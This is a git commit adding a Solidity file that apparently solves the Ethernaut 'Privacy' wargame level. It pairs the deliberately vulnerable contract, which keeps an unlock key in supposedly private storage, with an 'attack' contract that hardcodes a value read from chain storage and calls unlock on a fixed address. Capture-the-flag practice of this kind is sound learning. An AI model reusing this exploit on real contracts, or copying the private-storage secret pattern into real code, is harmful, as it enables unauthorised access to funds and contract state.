c38d3bf1483e28e90dd16dc0922139679afae520
oh7887 <118185225+oh7887@users.noreply.github.com>
2023-02-25 20:51:28 +0800

    Create 13.sol

---
+++ 13.sol
@@ -0,0 +1,40 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(block.timestamp);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+  */
+}
+contract attack{
+  bytes32 public data = 0x53f99c33c09cbe3383bc390636f93b6d6b10bdcc7d1de24efbe523a7fb65cad3;
+  bytes16 public key = bytes16(data);
+  constructor()public
+  {
+    Privacy p = Privacy(0xa955B4357DB8990b79E9E61AAf90B09e0AD354Ac);
+    p.unlock(key);
+  }
+}
